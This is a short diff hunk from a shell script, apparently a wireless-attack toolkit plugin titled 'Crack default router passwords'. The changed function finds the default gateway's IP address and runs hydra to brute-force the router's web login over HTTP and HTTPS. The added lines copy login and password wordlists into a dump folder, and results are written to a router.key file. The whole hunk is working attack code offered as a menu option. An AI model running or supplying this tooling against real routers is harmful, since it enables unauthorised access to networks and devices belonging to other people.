@@ -20,6 +20,8 @@ p_menu+=("Crack default router passwords");
 
 hydra_(){
     router_ip=$(ip route list dev $wificard |awk '/default/ { print $3}' );
+    cp $path/plugins/hydra_logins $DUMP_PATH/default_router_logins;
+    cp $path/plugins/hydra_passwords $DUMP_PATH/default_router_passwords;
     hydra  -L $DUMP_PATH/default_router_logins -P $DUMP_PATH/default_router_passwords -o $DUMP_PATH/router.key $router_ip http-get || {
     hydra  -L $DUMP_PATH/default_router_logins -P $DUMP_PATH/default_router_passwords -o $DUMP_PATH/router.key $router_ip http-head } || {
     hydra  -L $DUMP_PATH/default_router_logins -P $DUMP_PATH/default_router_passwords -o $DUMP_PATH/router.key $router_ip https-head }
